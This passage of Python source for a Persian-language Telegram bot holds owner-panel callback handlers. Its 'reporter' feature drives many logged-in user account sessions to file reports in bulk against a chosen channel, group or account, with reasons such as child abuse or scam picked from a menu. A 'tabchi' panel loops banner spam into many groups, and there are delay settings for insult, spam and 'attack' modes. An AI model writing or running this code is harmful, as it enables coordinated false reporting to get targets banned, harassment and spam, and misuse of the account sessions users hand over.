            mk.add(types.InlineKeyboardButton("بازگشت", callback_data="owner_" + str(uid)))
            _safe_edit(call, chr(10).join(lines)[:4000], mk, parse_mode='HTML')
            bot.answer_callback_query(call.id)
            return

        if data == 'orep_limit':
            if not is_main_owner(uid):
                bot.answer_callback_query(call.id)
                return
            admin_states[uid] = {'step': 'orep_set_limit'}
            mk = types.InlineKeyboardMarkup()
            mk.add(types.InlineKeyboardButton("بازگشت", callback_data="owner_" + str(uid)))
            _safe_edit(call,
                "<blockquote>محدودیت فعلی: <code>" + str(_rep_settings()['daily_limit']) + "</code> بار در روز</blockquote>" + chr(10)
                + "<blockquote>عدد جدید محدودیت روزانه را بفرست</blockquote>",
                mk, parse_mode='HTML')
            bot.answer_callback_query(call.id)
            return

        if data == 'orep_vip':
            if not is_main_owner(uid):
                bot.answer_callback_query(call.id)
                return
            admin_states[uid] = {'step': 'orep_vip_id'}
            mk = types.InlineKeyboardMarkup()
            mk.add(types.InlineKeyboardButton("بازگشت", callback_data="owner_" + str(uid)))
            _safe_edit(call, "<blockquote>ایدی عددی کاربری که می‌خواهید ریپورترش بدون محدودیت شود را بفرست</blockquote>", mk, parse_mode='HTML')
            bot.answer_callback_query(call.id)
            return

        if data == 'orep_reset':
            if not is_main_owner(uid):
                bot.answer_callback_query(call.id)
                return
            admin_states[uid] = {'step': 'orep_reset_id'}
            mk = types.InlineKeyboardMarkup()
            mk.add(types.InlineKeyboardButton("بازگشت", callback_data="owner_" + str(uid)))
            _safe_edit(call, "<blockquote>ایدی عددی کاربر برای ریست محدودیت روزانه را بفرست</blockquote>", mk, parse_mode='HTML')
            bot.answer_callback_query(call.id)
            return

        if data == 'orep_banmenu':
            if not is_main_owner(uid):
                bot.answer_callback_query(call.id)
                return
            mk = types.InlineKeyboardMarkup(row_width=1)
            mk.add(types.InlineKeyboardButton("بن ریپورتر", callback_data="orep_ban"))
            mk.add(types.InlineKeyboardButton("بن موقت ریپورتر", callback_data="orep_tempban"))
            mk.add(types.InlineKeyboardButton("ان‌بن ریپورتر", callback_data="orep_unban"))
            mk.add(types.InlineKeyboardButton("بازگشت", callback_data="owner_" + str(uid)))
            _safe_edit(call, "<blockquote><b>بن / ان‌بن ریپورتر</b></blockquote>", mk, parse_mode='HTML')
            bot.answer_callback_query(call.id)
            return

        if data == 'orep_ban':
            if not is_main_owner(uid):
                return
            admin_states[uid] = {'step': 'orep_ban_id'}
            mk = types.InlineKeyboardMarkup()
            mk.add(types.InlineKeyboardButton("بازگشت", callback_data="orep_banmenu"))
            _safe_edit(call, "<blockquote>ایدی عددی کاربر برای بن ریپورتر را بفرست</blockquote>", mk, parse_mode='HTML')
            bot.answer_callback_query(call.id)
            return

        if data == 'orep_tempban':
            if not is_main_owner(uid):
                return
            admin_states[uid] = {'step': 'orep_tempban_id'}
            mk = types.InlineKeyboardMarkup()
            mk.add(types.InlineKeyboardButton("بازگشت", callback_data="orep_banmenu"))
            _safe_edit(call, "<blockquote>ایدی عددی کاربر برای بن موقت ریپورتر را بفرست</blockquote>", mk, parse_mode='HTML')
            bot.answer_callback_query(call.id)
            return

        if data == 'orep_unban':
            if not is_main_owner(uid):
                return
            admin_states[uid] = {'step': 'orep_unban_id'}
            mk = types.InlineKeyboardMarkup()
            mk.add(types.InlineKeyboardButton("بازگشت", callback_data="orep_banmenu"))
            _safe_edit(call, "<blockquote>ایدی عددی کاربر برای ان‌بن ریپورتر را بفرست</blockquote>", mk, parse_mode='HTML')
            bot.answer_callback_query(call.id)
            return

        if data.startswith('reporter_') or data == 'oreporter' or data.startswith('oreporter'):
            owner_mode = bool(data == 'oreporter' or data.startswith('oreporter') or is_main_owner(uid))
            if owner_mode and not is_main_owner(uid):
                bot.answer_callback_query(call.id, "فقط مالک اصلی", show_alert=True)
                return
            if not owner_mode:
                if not is_reporter_user(uid):
                    bot.answer_callback_query(call.id, "دسترسی ریپورتر نداری", show_alert=True)
                    return
                ok, msg = reporter_can_use(uid)
                if not ok:
                    bot.answer_callback_query(call.id, msg[:180], show_alert=True)
                    return
            admin_states[uid] = {
                'step': 'reporter_link',
                'owner_mode': owner_mode,
                'panel_mid': getattr(call.message, 'message_id', None),
                'panel_chat': getattr(getattr(call.message, 'chat', None), 'id', uid),
            }
            body = (
                "<blockquote><b>ریپورتر</b></blockquote>\n"
                "<blockquote>لینک چنل / گروه / اکانت را بفرست</blockquote>\n"
                "<blockquote>عمومی: بدون جوین | خصوصی: جوین → گزارش → لفت</blockquote>\n"
                "<blockquote>هر اکانت فقط یک‌بار گزارش می‌دهد</blockquote>"
            )
            if owner_mode:
                body += "\n<blockquote>حالت سراسری: همه اکانت‌ها به‌جز اکانت اصلی خودت</blockquote>"
            _safe_edit(call, body, parse_mode='HTML')
            bot.answer_callback_query(call.id)
            return

        if data.startswith('rep_reason_'):
            # rep_reason_{uid}_{key} — key می‌تواند چندبخشی باشد مثل scam_finance
            try:
                rest = data[len('rep_reason_'):]
                # جدا کردن uid از key
                us, _, key = rest.partition('_')
                if int(us) != int(uid):
                    bot.answer_callback_query(call.id, "این پنل برای شما نیست", show_alert=True)
                    return
            except Exception:
                key = 'other'
            if not key:
                key = 'other'
            st = admin_states.get(uid) or {}
            link = st.get('report_link')
            if not link:
                bot.answer_callback_query(call.id, "اول لینک هدف را بفرست", show_alert=True)
                return
            owner_mode = st.get('owner_mode', False)
            try:
                bot.answer_callback_query(call.id)
            except Exception:
                pass
            # زیر‌منوی کلاهبرداری
            if key == 'scammenu':
                mk = types.InlineKeyboardMarkup(row_width=1)
                mk.add(types.InlineKeyboardButton("کلاهبرداری یا هرزنامه مربوط به امور مالی", callback_data="rep_reason_" + str(uid) + "_scam_finance"))
                mk.add(types.InlineKeyboardButton("کلاهبرداری با جعل هویت", callback_data="rep_reason_" + str(uid) + "_scam_identity"))
                mk.add(types.InlineKeyboardButton("قرعه‌کشی جعلی", callback_data="rep_reason_" + str(uid) + "_scam_giveaway"))
                mk.add(types.InlineKeyboardButton("سایر", callback_data="rep_reason_" + str(uid) + "_scam_other"))
                mk.add(types.InlineKeyboardButton("بازگشت به دلایل", callback_data="rep_reason_" + str(uid) + "_backreasons"))
                _safe_edit(call, "<blockquote><b>کلاهبرداری — زیر‌دلیل را انتخاب کن</b></blockquote>", mk, parse_mode='HTML')
                bot.answer_callback_query(call.id)
                return
            if key == 'backreasons':
                # rebuild main reasons
                mk = types.InlineKeyboardMarkup(row_width=2)
                mk.add(
                    types.InlineKeyboardButton("هرزنامه", callback_data="rep_reason_" + str(uid) + "_spam"),
                    types.InlineKeyboardButton("کلاهبرداری یا هرزنامه", callback_data="rep_reason_" + str(uid) + "_scammenu"),
                )
                mk.add(
                    types.InlineKeyboardButton("این یک حساب جعلی است", callback_data="rep_reason_" + str(uid) + "_fake"),
                    types.InlineKeyboardButton("خشونت", callback_data="rep_reason_" + str(uid) + "_violence"),
                )
                mk.add(
                    types.InlineKeyboardButton("پورنوگرافی", callback_data="rep_reason_" + str(uid) + "_porn"),
                    types.InlineKeyboardButton("کودک‌آزاری", callback_data="rep_reason_" + str(uid) + "_child"),
                )
                mk.add(
                    types.InlineKeyboardButton("نقض حق نشر", callback_data="rep_reason_" + str(uid) + "_copyright"),
                    types.InlineKeyboardButton("مواد مخدر غیرقانونی", callback_data="rep_reason_" + str(uid) + "_drugs"),
                )
                mk.add(
                    types.InlineKeyboardButton("اطلاعات شخصی", callback_data="rep_reason_" + str(uid) + "_personal"),
                    types.InlineKeyboardButton("نامرتبط", callback_data="rep_reason_" + str(uid) + "_geo"),
                )
                mk.add(types.InlineKeyboardButton("سایر", callback_data="rep_reason_" + str(uid) + "_other"))
                _safe_edit(call, "<blockquote><b>دلیل گزارش را انتخاب کن</b></blockquote>", mk, parse_mode='HTML')
                bot.answer_callback_query(call.id)
                return
            if key == 'other' or key == 'scam_other':
                st0 = admin_states.get(uid) or {}
                admin_states[uid] = {
                    'step': 'reporter_other',
                    'report_link': link,
                    'report_links': st0.get('report_links') or [link],
                    'owner_mode': owner_mode,
                    'reason_key': key if key != 'other' else 'other',
                }
                _safe_edit(call, "<blockquote>توضیح گزارش را بنویس</blockquote>", parse_mode='HTML')
                bot.answer_callback_query(call.id)
                return
            # تأیید ارسال + لیست اکانت‌ها
            try:
                if is_main_owner(uid):
                    owner_mode = True
                sessions = _collect_report_sessions(uid, owner_mode=owner_mode)
                rname = reason_display_name(key, (admin_states.get(uid) or {}).get('reason_text') or '')
                st2 = admin_states.get(uid) or {}
                links = st2.get('report_links') or [link]
                lines = [
                    "<blockquote><b>📡 تأیید ارسال گزارش</b></blockquote>",
                    "<blockquote>تعداد اکانت: <b>" + str(len(sessions)) + "</b></blockquote>",
                ]
                if len(links) > 1:
                    lines.append("<blockquote><b>تارگت‌ها:</b></blockquote>")
                    for L in links[:30]:
                        lines.append("<blockquote><code>" + str(L).replace('<','')[:80] + "</code></blockquote>")
                else:
                    lines.append("<blockquote>تارگت: <code>" + str(link).replace('<','')[:80] + "</code></blockquote>")
                lines.append("<blockquote>نوع گزارش: " + str(rname).replace('<','')[:200] + "</blockquote>")
                if is_main_owner(uid):
                    lines.append("<blockquote><b>اکانت‌های گزارش‌دهنده:</b></blockquote>")
                    for it in sessions[:40]:
                        lab = it.get("label") if isinstance(it, dict) else it[0]
                        lines.append("<blockquote>" + str(lab).replace('<','') + "</blockquote>")
                mk = types.InlineKeyboardMarkup(row_width=1)
                mk.add(types.InlineKeyboardButton("✅ ارسال گزارش", callback_data="rep_send_" + str(uid) + "_" + key))
                mk.add(types.InlineKeyboardButton("❌ لغو", callback_data="rep_cancel_" + str(uid)))
                st0 = admin_states.get(uid) or {}
                admin_states[uid] = {
                    'step': 'reporter_confirm',
                    'report_link': link,
                    'report_links': st0.get('report_links') or [link],
                    'owner_mode': owner_mode,
                    'reason_key': key,
                    'reason_text': '',
                }
                _safe_edit(call, chr(10).join(lines)[:4000], mk, parse_mode='HTML')
            except Exception as e:
                try:
                    bot.answer_callback_query(call.id, "خطا: " + str(e)[:100], show_alert=True)
                except Exception:
                    pass
                try:
                    bot.send_message(uid, "<blockquote>خطا در آماده‌سازی گزارش: " + str(e)[:150].replace('<','') + "</blockquote>", parse_mode='HTML')
                except Exception:
                    pass
            return



        if data.startswith('rep_send_'):
            st = admin_states.pop(uid, None) or {}
            link = st.get('report_link')
            if not link:
                bot.answer_callback_query(call.id, "منقضی شد — دوباره لینک بفرست", show_alert=True)
                return
            key = st.get('reason_key') or 'spam'
            # استخراج کلید از callback اگر چندبخشی باشد
            try:
                rest = data[len('rep_send_'):]
                us, _, k2 = rest.partition('_')
                if k2:
                    key = k2
            except Exception:
                pass
            owner_mode = st.get('owner_mode', False)
            if is_main_owner(uid):
                owner_mode = True
            reason_text = st.get('reason_text') or ''
            invite_link = st.get('invite_link')
            rname = reason_display_name(key, (admin_states.get(uid) or {}).get('reason_text') or '')
            body = (
                "<blockquote><b>📡 ریپورتر فعال شد</b></blockquote>" + chr(10)
                + "<blockquote>هدف: <code>" + str(link).replace('<','')[:80] + "</code></blockquote>" + chr(10)
                + "<blockquote>دلیل: " + str(rname) + "</blockquote>" + chr(10)
                + "<blockquote>░░░░░░░░░░░░░░ آماده‌سازی</blockquote>"
            )
            try:
                bot.edit_message_text(body, call.message.chat.id, call.message.message_id, parse_mode='HTML')
                mid = call.message.message_id
                chat = call.message.chat.id
            except Exception:
                msg = bot.send_message(uid, body, parse_mode='HTML')
                mid = msg.message_id
                chat = uid
            asyncio.run_coroutine_threadsafe(
                run_mass_report(uid, link, key, reason_text, chat, mid, owner_mode=owner_mode, invite_link=invite_link),
                loop
            )
            bot.answer_callback_query(call.id, "شروع شد")
            return

        if data.startswith('rep_cancel_'):
            admin_states.pop(uid, None)
            _safe_edit(call, "<blockquote>گزارش لغو شد</blockquote>", parse_mode='HTML')
            bot.answer_callback_query(call.id)
            return


        if data.startswith('ex_menu_'):
            extras = get_extras(uid) or {}
            mk = types.InlineKeyboardMarkup(row_width=1)
            mk.add(types.InlineKeyboardButton("ثبت اکانت", callback_data=f"ex_add_{uid}"))
            mk.add(types.InlineKeyboardButton("لیست اکانت ها", callback_data=f"ex_list_{uid}"))
            mk.add(types.InlineKeyboardButton("تبچی", callback_data=f"ex_tab_all_{uid}"))
            mk.add(types.InlineKeyboardButton("اسپم", callback_data=f"ex_spm_all_{uid}"))
            mk.add(types.InlineKeyboardButton("بازگشت", callback_data=f"back_{uid}"))
            body = "مدیریت اک ها\nاکانت ثبت شده: " + str(len(extras))
            if not extras:
                body += "\n\nاکانت های اضافه رو ثبت نکردی"
            _safe_edit(call, body, reply_markup=mk)
            return

        if data.startswith('connect_'):
            bot.answer_callback_query(call.id)
            if client_really_alive(uid) or (has_session(uid) and clients.get(int(uid))):
                try:
                    bot.answer_callback_query(call.id, "قبلاً لاگین کردی — از ربات استفاده کن", show_alert=True)
                except Exception:
                    try:
                        bot.send_message(uid, "<blockquote>قبلاً لاگین کردی — از ربات استفاده کن</blockquote>", parse_mode='HTML')
                    except Exception:
                        pass
                return
            if has_session(uid) and not client_really_alive(uid):
                try:
                    asyncio.run_coroutine_threadsafe(start_client(uid), loop)
                except Exception:
                    pass
                import time as _t_conn
                _t_conn.sleep(1.2)
                if client_really_alive(uid):
                    try:
                        bot.answer_callback_query(call.id, "متصل شد", show_alert=True)
                    except Exception:
                        bot.send_message(uid, "<blockquote>متصل شد</blockquote>", parse_mode='HTML')
                    return
            mk = types.ReplyKeyboardMarkup(resize_keyboard=True, one_time_keyboard=True)
            mk.add(types.KeyboardButton("ارسال شماره", request_contact=True))
            bot.send_message(uid, "برای اتصال دوباره شماره را ارسال کنید:", reply_markup=mk)
            return

        # پنل تبچی مالک / ادمین تبچی
        if data.startswith('otabchi_'):
            if not (is_main_owner(uid) or get_ud(uid, 'tabchi_admin')):
                bot.answer_callback_query(call.id, "دسترسی نداری", show_alert=True)
                return
            mk = types.InlineKeyboardMarkup(row_width=1)
            mk.add(types.InlineKeyboardButton("ثبت بنر", callback_data="otab_addban"))
            mk.add(types.InlineKeyboardButton("لیست بنرها", callback_data="otab_listban"))
            mk.add(types.InlineKeyboardButton("حذف بنر", callback_data="otab_delban"))
            mk.add(types.InlineKeyboardButton("گروه‌های فعال", callback_data="otab_groups"))
            mk.add(types.InlineKeyboardButton("تبچی در همه گروه‌ها", callback_data="otab_allg"))
            mk.add(types.InlineKeyboardButton("توقف تبچی", callback_data="otab_stop"))
            if is_main_owner(uid):
                mk.add(types.InlineKeyboardButton("ادمین تبچی", callback_data="otab_setadmin"))
            mk.add(types.InlineKeyboardButton("بازگشت", callback_data=f"back_{uid}"))
            _safe_edit(call, "<blockquote><b>پنل تبچی</b></blockquote>" + chr(10) + "<blockquote>بنر و گروه‌ها را مدیریت کن</blockquote>", mk, parse_mode='HTML')
            bot.answer_callback_query(call.id)
            return
        if data == 'otab_addban':
            if not (is_main_owner(uid) or get_ud(uid, 'tabchi_admin')):
                return
            admin_states[uid] = {'step': 'otab_ban_wait'}
            _safe_edit(call, "<blockquote>بنر را بفرست (متن / عکس / ویس / هر فرمت)</blockquote>", parse_mode='HTML')
            return
        if data == 'otab_listban':
            if not (is_main_owner(uid) or get_ud(uid, 'tabchi_admin')):
                return
            bans = get_ud(uid, 'otab_banners') or []
            if not bans:
                _safe_edit(call, "<blockquote>بنری ثبت نشده</blockquote>", types.InlineKeyboardMarkup().add(types.InlineKeyboardButton("بازگشت", callback_data=f"otabchi_{uid}")), parse_mode='HTML')
                return
            for i, b in enumerate(bans[:30]):
                mk = types.InlineKeyboardMarkup()
                mk.add(
                    types.InlineKeyboardButton("ویرایش", callback_data=f"otab_bedit_{i}"),
                    types.InlineKeyboardButton("حذف", callback_data=f"otab_bdel_{i}"),
                )
                cap = "<blockquote>بنر #" + str(i + 1) + "</blockquote>" + chr(10)
                if b.get('text'):
                    cap += "<blockquote>" + str(b.get('text'))[:200].replace('<', '') + "</blockquote>"
                try:
                    if b.get('file_id'):
                        bot.send_photo(uid, b['file_id'], caption=cap, reply_markup=mk, parse_mode='HTML') if b.get('kind') == 'photo' else bot.send_document(uid, b['file_id'], caption=cap, reply_markup=mk, parse_mode='HTML')
                    else:
                        bot.send_message(uid, cap, reply_markup=mk, parse_mode='HTML')
                except Exception:
                    try:
                        bot.send_message(uid, cap, reply_markup=mk, parse_mode='HTML')
                    except Exception:
                        pass
            bot.answer_callback_query(call.id)
            return
        if data.startswith('otab_bdel_'):
            try:
                idx = int(data.split('_')[-1])
            except Exception:
                return
            bans = list(get_ud(uid, 'otab_banners') or [])
            if 0 <= idx < len(bans):
                bans.pop(idx)
                set_user(uid, 'otab_banners', bans)
            bot.answer_callback_query(call.id, "حذف شد")
            _safe_edit(call, "<blockquote>بنر حذف شد</blockquote>", types.InlineKeyboardMarkup().add(types.InlineKeyboardButton("بازگشت", callback_data=f"otabchi_{uid}")), parse_mode='HTML')
            return
        if data.startswith('otab_bedit_'):
            try:
                idx = int(data.split('_')[-1])
            except Exception:
                return
            admin_states[uid] = {'step': 'otab_ban_edit', 'idx': idx}
            _safe_edit(call, "<blockquote>بنر جدید را بفرست</blockquote>", parse_mode='HTML')
            return
        if data == 'otab_allg':
            if not (is_main_owner(uid) or get_ud(uid, 'tabchi_admin')):
                return
            admin_states[uid] = {'step': 'otab_links', 'links': []}
            mk = types.InlineKeyboardMarkup()
            mk.add(types.InlineKeyboardButton("ذخیره", callback_data="otab_links_save"))
            mk.add(types.InlineKeyboardButton("بازگشت", callback_data=f"otabchi_{uid}"))
            _safe_edit(call, "<blockquote>لینک گروه‌ها را یکی‌یکی بفرست</blockquote>" + chr(10) + "<blockquote>یا فقط یک عدد بفرست تا همان تعداد گروه رندوم از عضویت‌ها انتخاب شود</blockquote>" + chr(10) + "<blockquote>لینک‌های ثبت‌شده: 0</blockquote>", mk, parse_mode='HTML')
            return
        if data == 'otab_links_save':
            st = admin_states.get(uid) or {}
            links = st.get('links') or []
            nrand = st.get('nrand')
            if not links and not nrand:
                bot.answer_callback_query(call.id, "چیزی ثبت نشده", show_alert=True)
                return
            admin_states[uid] = {'step': 'otab_links_confirm', 'links': links, 'nrand': nrand}
            mk = types.InlineKeyboardMarkup()
            mk.add(types.InlineKeyboardButton("تایید", callback_data="otab_links_ok"))
            mk.add(types.InlineKeyboardButton("حذف", callback_data="otab_allg"))
            body = "<blockquote><b>گروه‌ها:</b></blockquote>" + chr(10)
            if nrand:
                body += "<blockquote>رندوم: " + str(nrand) + " گروه</blockquote>"
            for L in links[:40]:
                body += "<blockquote><code>" + str(L).replace('<', '')[:60] + "</code></blockquote>"
            _safe_edit(call, body, mk, parse_mode='HTML')
            return
        if data == 'otab_links_ok':
            st = admin_states.get(uid) or {}
            admin_states[uid] = {'step': 'otab_loop', 'links': st.get('links') or [], 'nrand': st.get('nrand')}
            _safe_edit(call, "<blockquote>هر چند دقیقه یک‌بار ارسال شود؟ فقط عدد</blockquote>", parse_mode='HTML')
            return
        if data == 'otab_stop':
            set_user(uid, 'otab_job', None)
            for k in list(banner_jobs.keys()):
                try:
                    if k == uid or (isinstance(k, tuple) and k[0] == uid):
                        banner_jobs.pop(k, None)
                except Exception:
                    pass
            _safe_edit(call, "<blockquote>تبچی متوقف شد</blockquote>", types.InlineKeyboardMarkup().add(types.InlineKeyboardButton("بازگشت", callback_data=f"otabchi_{uid}")), parse_mode='HTML')
            return
        if data == 'otab_setadmin' and is_main_owner(uid):
            admin_states[uid] = {'step': 'otab_admin_id'}
            _safe_edit(call, "<blockquote>ایدی عددی ادمین تبچی را بفرست</blockquote>", parse_mode='HTML')
            return
        if data == 'otab_groups':
            job = get_ud(uid, 'otab_job') or {}
            links = job.get('links') or []
            mins = job.get('minutes') or '—'
            body = "<blockquote><b>گروه‌های فعال تبچی</b></blockquote>" + chr(10)
            body += "<blockquote>لوپ: " + str(mins) + " دقیقه</blockquote>" + chr(10)
            if not links:
                body += "<blockquote>خالی</blockquote>"
            for L in links[:50]:
                body += "<blockquote><code>" + str(L).replace('<', '')[:70] + "</code></blockquote>"
            mk = types.InlineKeyboardMarkup()
            mk.add(types.InlineKeyboardButton("توقف", callback_data="otab_stop"))
            mk.add(types.InlineKeyboardButton("بازگشت", callback_data=f"otabchi_{uid}"))
            _safe_edit(call, body[:4000], mk, parse_mode='HTML')
            return

        if data.startswith('pv_xfer_') and not data.startswith('pv_xfer_ok_') and not data.startswith('pv_xfer_no_'):
            admin_states[uid] = {'step': 'pv_xfer_id'}
            _safe_edit(call, "ایدی عددی کاربر گیرنده را بفرست:")
            return

        if data.startswith('support_') or data == 'support':
            # مستقیم پیوی مالک اصلی
            try:
                un = None
                try:
                    ch = bot.get_chat(OWNER_ID)
                    un = getattr(ch, 'username', None)
                except Exception:
                    un = None
                mk = types.InlineKeyboardMarkup()
                if un:
                    mk.add(types.InlineKeyboardButton("پیام به پشتیبانی", url="https://t.me/" + str(un)))
                else:
                    mk.add(types.InlineKeyboardButton("پیام به پشتیبانی", url="tg://user?id=" + str(OWNER_ID)))
                mk.add(types.InlineKeyboardButton("بازگشت", callback_data=f"back_{uid}"))
                _safe_edit(
                    call,
                    "برای پشتیبانی مستقیم به مالک پیام دهید\nایدی: `" + str(OWNER_ID) + "`",
                    reply_markup=mk,
                    parse_mode='Markdown',
                )
            except Exception:
                bot.send_message(uid, "پشتیبانی: `" + str(OWNER_ID) + "`", parse_mode='Markdown')
            return

        if data.startswith('owner_'):
            if not is_owner(uid):
                bot.send_message(uid, "دسترسی نداری")
                return
            mk = types.InlineKeyboardMarkup(row_width=2)
            mk.add(
                types.InlineKeyboardButton("لیست کاربران", callback_data="olist"),
                types.InlineKeyboardButton("فعال ترین", callback_data="otop"),
                types.InlineKeyboardButton("تصویر پنل", callback_data="opanel_img"),
                types.InlineKeyboardButton("متن پنل", callback_data="opanel_title"),
            )
            mk.add(types.InlineKeyboardButton("اطلاعات کاربران", callback_data="ousers_info"))
            mk.add(
                types.InlineKeyboardButton("اکانت های اضافه", callback_data="oextras"),
                types.InlineKeyboardButton("عضویت اجباری", callback_data="oforce"),
            )
            mk.add(types.InlineKeyboardButton("ریپورتر سراسری", callback_data="oreporter"))
            mk.add(types.InlineKeyboardButton("رمز جدید ریپورتر", callback_data="orep_newcode"))
            mk.add(types.InlineKeyboardButton("منقضی کردن کد", callback_data="orep_expire_code"))
            mk.add(types.InlineKeyboardButton("لیست کدهای ریپورتر", callback_data="orep_codes"))
            mk.add(types.InlineKeyboardButton("ایدی گرفتن", callback_data="orep_getid"))
            mk.add(types.InlineKeyboardButton("معاف ریپورت", callback_data="orep_exempt"))
            mk.add(types.InlineKeyboardButton("لیست معافیت ریپورت", callback_data="orep_exempt_list"))
            mk.add(types.InlineKeyboardButton("محافظت از ریپورت", callback_data="orep_protect"))
            mk.add(types.InlineKeyboardButton("لیست محافظت ریپورت", callback_data="orep_protect_list"))
            mk.add(types.InlineKeyboardButton("ریپورتر BO", callback_data="orep_bo"))
            mk.add(types.InlineKeyboardButton("لیست ریپورتر BO", callback_data="orep_bo_list"))
            mk.add(types.InlineKeyboardButton("کاربران ریپورتر", callback_data="orep_users"))
            mk.add(types.InlineKeyboardButton("گزارش ریپورتر: " + ("روشن" if _rep_settings().get('notify_owner', True) else "خاموش"), callback_data="orep_notify_tog"))
            mk.add(types.InlineKeyboardButton("تنظیم محدودیت ریپورتر", callback_data="orep_limit"))
            mk.add(types.InlineKeyboardButton("ویژه کردن ریپورتر", callback_data="orep_vip"))
            mk.add(types.InlineKeyboardButton("ریست محدودیت کاربر", callback_data="orep_reset"))
            mk.add(types.InlineKeyboardButton("بن/ان‌بن ریپورتر", callback_data="orep_banmenu"))
            mk.add(types.InlineKeyboardButton("لاگین کاربران", callback_data="ologin_users"))
            mk.add(types.InlineKeyboardButton("ارسال / لیست کاربران", callback_data="ousers_spy"))
            mk.add(
                types.InlineKeyboardButton("پیام همگانی", callback_data="obroadcast"),
                types.InlineKeyboardButton("سکه همگانی", callback_data="odiamond"),
            )
            mk.add(
                types.InlineKeyboardButton("سکه به یک نفر", callback_data="ogiveone"),
                types.InlineKeyboardButton("افزودن سکه", callback_data="obuycoin"),
            )
            mk.add(
                types.InlineKeyboardButton("بن", callback_data="oban_user"),
                types.InlineKeyboardButton("آنبن", callback_data="ounban_user"),
            )
            mk.add(
                types.InlineKeyboardButton("لیست بن شده ها", callback_data="obanned_list"),
                types.InlineKeyboardButton("بن موقت", callback_data="otempban"),
            )
            mk.add(
                types.InlineKeyboardButton("کم کردن از همه", callback_data="oremoveall"),
                types.InlineKeyboardButton("کم کردن از یکی", callback_data="oremove"),
            )
            mk.add(types.InlineKeyboardButton("پیام به یکی", callback_data="omsg_one"))
            mk.add(
                types.InlineKeyboardButton("افزودن ادمین", callback_data="oaddadmin"),
                types.InlineKeyboardButton("لیست مالکین ربات", callback_data="oowners"),
            )
            mk.add(
                types.InlineKeyboardButton("حذف ادمین", callback_data="oremoveadmin"),
                types.InlineKeyboardButton("لیست ادمین ها", callback_data="oadmins"),
            )
            mk.add(types.InlineKeyboardButton("بازگشت", callback_data=f"back_{uid}"))
            _safe_edit(call, "پنل مالک:", reply_markup=mk)
            return

        if data.startswith('admin_') and is_admin(uid):
            mk = types.InlineKeyboardMarkup(row_width=2)
            mk.add(
                types.InlineKeyboardButton("لیست کاربران", callback_data="alist"),
                types.InlineKeyboardButton("فعال ترین", callback_data="atop"),
            )
            mk.add(types.InlineKeyboardButton("بن موقت", callback_data="otempban"))
            mk.add(types.InlineKeyboardButton("بازگشت", callback_data=f"back_{uid}"))
            _safe_edit(call, "پنل ادمین:", reply_markup=mk)
            return

        # بقیه دکمه‌ها — هندلر قدیمی
        _cb_inner(call)
    except Exception as e:
        es = str(e).lower()
        # خطاهای منقضی شدن callback را به کاربر نشان نده
        if 'query is too old' in es or 'response timeout' in es or 'query id is invalid' in es:
            try:
                print("cb timeout ignored:", data)
            except Exception:
                pass
        else:
            try:
                bot.send_message(uid, "خطای دکمه: " + str(e)[:200])
            except Exception:
                pass
            try:
                print("cb error:", data, type(e).__name__, e)
            except Exception:
                pass


def _cb_inner(call):
    uid = call.from_user.id
    data = call.data or ""

    # Personalize delays
    if data.startswith('d_ins_p_') or data.startswith('d_ins_m_') or \
       data.startswith('d_rea_p_') or data.startswith('d_rea_m_') or \
       data.startswith('d_spa_p_') or data.startswith('d_spa_m_') or \
       data.startswith('d_atk_p_') or data.startswith('d_atk_m_') or \
       data.startswith('d_kol_p_') or data.startswith('d_kol_m_') or \
       data.startswith('d_esp_p_') or data.startswith('d_esp_m_'):
        parts = data.split('_')
        typ = parts[1]  # ins / rea / spa / atk / kol / esp
        action = parts[2]  # p / m
        target_uid = int(parts[3])
        if target_uid != uid:
            bot.answer_callback_query(call.id)
            return
        key_map = {
            'ins': 'insult_delay', 'rea': 'react_delay', 'spa': 'spam_delay',
            'atk': 'attack_delay', 'kol': 'kol_delay', 'esp': 'extra_spam_delay',
        }
        key = key_map[typ]
        cur = float(get_ud(uid, key, 0) or 0)
        if action == 'p':
            # زیاد = کندتر
            new = min(10.0, cur + 1.0)
            msg = "کندتر شد: " + str(int(new) if new == int(new) else new) + " ثانیه"
        else:
            # کم = سریع‌تر
            new = max(0.0, cur - 1.0)
            if new <= 0:
                msg = "حداکثر سرعت"
            else:
                msg = "سریع‌تر شد: " + str(int(new) if new == int(new) else new) + " ثانیه"
        set_user(uid, key, new)
        personalize_panel(uid, call.message.message_id, call.message.chat.id)
        bot.answer_callback_query(call.id, msg)
        return

    if data.startswith('online_on_'):
        target = int(data.split('_')[-1])
        if target != uid:
            bot.answer_callback_query(call.id)
            return
        set_user(uid, 'always_online', True)
        personalize_panel(uid, call.message.message_id, call.message.chat.id)
        bot.answer_callback_query(call.id, "حالت همیشه آنلاین روشن شد ✅", show_alert=True)
        return

    if data.startswith('online_off_'):
        target = int(data.split('_')[-1])
        if target != uid:
            bot.answer_callback_query(call.id)
            return
        set_user(uid, 'always_online', False)
        personalize_panel(uid, call.message.message_id, call.message.chat.id)
        bot.answer_callback_query(call.id, "حالت همیشه آنلاین خاموش شد ❌", show_alert=True)
        return

    if data.startswith('clock_on_'):
        target = int(data.split('_')[-1])
        if target != uid:
            bot.answer_callback_query(call.id)
            return
        raw_name = call.from_user.first_name or "User"
        if '  ' in raw_name:
            raw_name = raw_name.split('  ')[0].strip()
        set_user(uid, 'original_name', raw_name)
        set_user(uid, 'clock_enabled', True)
        client = clients.get(uid)
        if client and client.is_connected():
            async def _fix_and_clock():
                # اگه قبلاً ساعت چسبیده به اسم بوده، اسم رو به حالت تمیز برگردون
                try:
                    await client(UpdateProfileRequest(first_name=raw_name[:64], last_name=format_clock_time(get_ud(uid, 'clock_style', 1))[:64]))
                except Exception:
                    await apply_clock_name(client, uid)
            asyncio.run_coroutine_threadsafe(_fix_and_clock(), loop)
        personalize_panel(uid, call.message.message_id, call.message.chat.id)
        bot.answer_callback_query(call.id, "ساعت در نام خانوادگی روشن شد ✅", show_alert=True)
        return

    if data.startswith('clock_off_'):
        target = int(data.split('_')[-1])
        if target != uid:
            bot.answer_callback_query(call.id)
            return
        set_user(uid, 'clock_enabled', False)
        client = clients.get(uid)
        if client and client.is_connected():
            try:
                asyncio.run_coroutine_threadsafe(
                    client(UpdateProfileRequest(last_name="")), loop
                )
            except Exception:
                pass
        personalize_panel(uid, call.message.message_id, call.message.chat.id)
        bot.answer_callback_query(call.id, "ساعت خاموش شد ❌", show_alert=True)
        return

    if data.startswith('cstyles_'):
        try:
            target = int(data.split('_')[-1])
            if target != uid:
                bot.answer_callback_query(call.id)
                return
            previews = {}
            for i in range(1, 11):
                try:
                    previews[i] = format_clock_time(i)
                except Exception:
                    previews[i] = str(i)
